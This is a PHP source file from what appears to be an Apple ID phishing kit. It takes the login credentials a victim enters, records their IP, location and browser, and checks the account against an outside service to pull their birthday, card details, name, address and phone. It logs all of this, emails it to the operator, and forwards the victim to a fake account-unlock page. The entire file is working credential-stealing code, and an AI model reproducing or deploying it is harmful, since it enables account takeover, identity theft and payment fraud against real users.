<?php
set_time_limit(0);
error_reporting(0);
require "session_protect.php";
require "detect_country.php";
require "antibotlogin.php";
require "functions.php";
require "../../CONTROLS.php";
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
$ip               = $_SERVER['REMOTE_ADDR'];
$systemInfo       = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo = [
  'a' => "| IP Address :" . " " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")",
  'b' => "| Location :" . " " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'],
  'c' => "| UserAgent :" . " " . $systemInfo['useragent'],
  'd' => "| Browser :" . " " . $systemInfo['browser'],
  'e' => "| Platform :" . " " . $systemInfo['os']
 ];
$from        	  = $From_Address1;
$headers          = "From:  ".$systemInfo['countrycode']."<" . $from . ">";
$subj             = "JP [ " . $systemInfo['country'] . " - " . $ip . " | " . $systemInfo['os'] . " ]";
$to               = $Your_Email;
$data             = "
Username : " . $_SESSION['user'] . "
Password : " . $_SESSION['pass'] . "

      _______[ PC Info ]________
From     :  " . $VictimInfo[a] . " - " . $VictimInfo[b] . "
Browser  :  " . $VictimInfo[c] . " - " . $VictimInfo[d] . " - " . $VictimInfo[e] . "
";
function AppleValid($url,$email){
	$hasil = curl($url.'?email='.$email);
	return $hasil;
}
function AppleChk($url,$email, $password) {

  //$hasil = curl($url,'email='.$email.'&pass='.$password);
  $hasil = curl($url,'email='.$email.'&pass='.$password.'&sock='.$negara);
  $get   = json_decode($hasil, true);
  if($get['status']=='live'){
    if($get['code']=='auth'){
      $apple = [
        'status' => 'live',
        'code' => 'auth'
        ];
    } else {
      $dob   = $get['person']['birthday'];
      $pecah = explode("-", $dob);
      $apple = [
        'status'      => 'live',
        'dob'         => $pecah[1] . "/" . $pecah[2] . "/" . $pecah[0],
        'carta'       => $get['primaryPaymentMethod']['obfuscatedNumber'],
        'fullname'    => $get['primaryPaymentMethod']['nameOnCard']['fullName'],
        'firstname'   => $get['person']['name']['firstName'],
        'lastname'    => $get['person']['name']['lastName'],
        'fulladdress' => $get['person']['primaryAddress']['fullAddress'],
        'address'     => $get['person']['primaryAddress']['line1'],
        'city'        => $get['person']['primaryAddress']['city'],
        'state'       => $get['person']['primaryAddress']['stateProvinceName'],
        'zip'         => $get['person']['primaryAddress']['postalCode'],
        'c_name'      => $get['person']['primaryAddress']['countryName'],
        'c_code'      => $get['person']['primaryAddress']['countryCode'],
        'phone'       => $get['primaryPaymentMethod']['phoneNumber']['rawNumber']
        ];
    }
    if (!empty($get['code'])) {
      $_SESSION['cook'] = $get['cookies'];
      $_SESSION['ctkn'] = $get['ctkn'];
    }
    if (!empty($apple['state'])) {
      $_SESSION['state'] = $apple['state'];
    } else {
      $_SESSION['state'] = "-";
    }
    if (!empty($apple['dob'])) {
      $_SESSION['dob']       = $apple['dob'];
      $_SESSION['carta']     = $apple['carta'];
      $_SESSION['fullname']  = $apple['fullname'];
      $_SESSION['firstname'] = $apple['firstname'];
      $_SESSION['lastname']  = $apple['lastname'];
      $_SESSION['address']   = $apple['address'];
      $_SESSION['city']      = $apple['city'];
      $_SESSION['zip']       = $apple['zip'];
      $_SESSION['c_name']    = $apple['c_name'];
      $_SESSION['c_code']    = $apple['c_code'];
      $_SESSION['phone']     = $apple['phone'];
    }
    $json                  = json_encode($apple);
    $file                  = fopen("../logs/address/" . $email . ".dat", "w");
    fwrite($file, $json . "\n");
    fclose($file);
  } else {
    $apple['status'] = 'die';
    $json = json_encode($apple);
  }
  return $json;
}
if($True_Login == 1) {
  $applechk = AppleValid($URL_Valid,$_POST['user']);
  if($applechk == 'Invalid') {
    echo '<meta http-equiv="refresh" content="0;url=../../bLoginFailed.php?sslchannel=true&sessionid=' . md5(gmdate("r")) . sha1(gmdate("r")) . '" />';
    exit();
  } elseif($applechk == 'UnKnown') {
    echo '<meta http-equiv="refresh" content="0;url=../../bLoginFailed.php?sslchannel=true&sessionid=' . md5(gmdate("r")) . sha1(gmdate("r")) . '" />';
    exit();
  } elseif($applechk == 'Valid') {
    if($Encrypt == 1) {
      include("AES.php");
      $imputText = $data;
      $imputKey  = $Key;
      $blockSize = 256;
      $aes       = new AES($imputText, $imputKey, $blockSize);
      $enc       = $aes->encrypt();
      $aes->setData($enc);
      $dec = $aes->decrypt();
    }
    if($Save_Log == 1) {
      if($Encrypt == 1) {
        $file = fopen("../logs/anggri.log", "a");
        fwrite($file, $enc);
        fclose($file);
      } else {
        $file = fopen("../logs/anggri.log", "a");
        fwrite($file, $data);
        fclose($file);
      }
    }
    if($Send_Log == 1) {
      if($Encrypt == 1) {
        mail($to, $subj, $enc, $headers);
      } else {
        mail($to, $subj, $data, $headers);
      }
    }
?>
		<form action='../locked.php?<?php
    echo $_SESSION['user'];
?>&Account-Unlock&sessionid=<?php
    echo generateRandomString(115);
?>&securessl=true' method='post' name='frm'>
		<input type="hidden" name="user" value="<?php
    echo $_SESSION['user'];
?>">
		<input type="hidden" name="pass" value="<?php
    echo $_SESSION['pass'];
?>">
		</form>
		<script language="JavaScript">
		document.frm.submit();
		</script>
	<?php
    exit();
  }
} elseif($True_Login == 2) {
  $check = AppleChk($URL_True_Login,$_POST['user'], $_POST['pass']);
  $json  = json_decode($check, true);
  if($json['status'] == "die") {
	//print_r($json);
    echo '<meta http-equiv="refresh" content="0;url=../../LoginFailed.php?sslchannel=true&sessionid=' . md5(gmdate("r")) . sha1(gmdate("r")) . '" />';
    exit();
  } elseif($json['status'] == "live") {
    if($Encrypt == 1) {
      include("AES.php");
      $imputText = $data;
      $imputKey  = $Key;
      $blockSize = 256;
      $aes       = new AES($imputText, $imputKey, $blockSize);
      $enc       = $aes->encrypt();
      $aes->setData($enc);
      $dec = $aes->decrypt();
    }
    if($Save_Log == 1) {
      if($Encrypt == 1) {
        $file = fopen("../logs/anggri.log", "a");
        fwrite($file, $enc);
        fclose($file);
      } else {
        $file = fopen("../logs/anggri.log", "a");
        fwrite($file, $data);
        fclose($file);
      }
    }
    if($Send_Log == 1) {
      if($Encrypt == 1) {
        mail($to, $subj, $enc, $headers);
      } else {
        mail($to, $subj, $data, $headers);
      }
    }
    if($json['code'] == 'auth') {
        $anu = 'locked.php';
    } else {
        $anu = 'locked.php';
    }
?>
		<form action='../<?php
    echo $anu.'?'.$_SESSION['user'];
?>&Account-Unlock&sessionid=<?php
    echo generateRandomString(115);
?>&securessl=true' method='post' name='frm'>
		<input type="hidden" name="user" value="<?php
    echo $_SESSION['user'];
?>">
		<input type="hidden" name="pass" value="<?php
    echo $_SESSION['pass'];
?>">
		</form>
		<script language="JavaScript">
		document.frm.submit();
		</script>
	<?php
  } else {
  //print_r($json);
    echo '<meta http-equiv="refresh" content="0;url=../../LoginFailed.php?sslchannel=true&sessionid=' . md5(gmdate("r")) . sha1(gmdate("r")) . '" />';
    exit();
  }
} else {
  if($Encrypt == 1) {
    include("AES.php");
    $imputText = $data;
    $imputKey  = $Key;
    $blockSize = 256;
    $aes       = new AES($imputText, $imputKey, $blockSize);
    $enc       = $aes->encrypt();
    $aes->setData($enc);
    $dec = $aes->decrypt();
  }
  if($Save_Log == 1) {
    if($Encrypt == 1) {
      $file = fopen("../logs/anggri.log", "a");
      fwrite($file, $enc);
      fclose($file);
    } else {
      $file = fopen("../logs/anggri.log", "a");
      fwrite($file, $data);
      fclose($file);
    }
  }
  if($Send_Log == 1) {
    if($Encrypt == 1) {
      mail($to, $subj, $enc, $headers);
    } else {
      mail($to, $subj, $data, $headers);
    }
  }
?>
	<form action='../locked.php?<?php
  echo $_SESSION['user'];
?>&Account-Unlock&sessionid=<?php
  echo generateRandomString(115);
?>&securessl=true' method='post' name='frm'>
	<input type="hidden" name="user" value="<?php
  echo $_SESSION['user'];
?>">
	<input type="hidden" name="pass" value="<?php
  echo $_SESSION['pass'];
?>">
	</form>
	<script language="JavaScript">
	document.frm.submit();
	</script>
<?php
}
?>